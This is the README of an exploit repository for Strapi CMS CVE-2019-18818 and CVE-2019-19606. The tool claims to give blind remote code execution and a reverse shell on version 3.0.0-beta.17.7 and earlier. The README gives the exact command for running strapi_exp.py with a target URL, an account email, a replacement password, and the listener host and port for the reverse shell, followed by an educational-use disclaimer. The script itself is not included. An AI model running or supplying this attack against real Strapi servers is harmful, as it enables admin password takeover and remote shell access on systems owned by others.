# Strapi CMS CVE-2019-18818 and 19606 

Blind Remote Code Execution of Strapi CMS Version 3.0.0-beta.17.7 and earlier to get reverse shell

## Getting Started

### Executing program

* Using python3
```
python3 strapi_exp.py -t http://strapi.hack/ -e fake@email.com -p new_password -lhost 127.0.0.1 -lport 9001
```

## Help

Help prompt
```
python3 strapi_exp.py -h
```

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.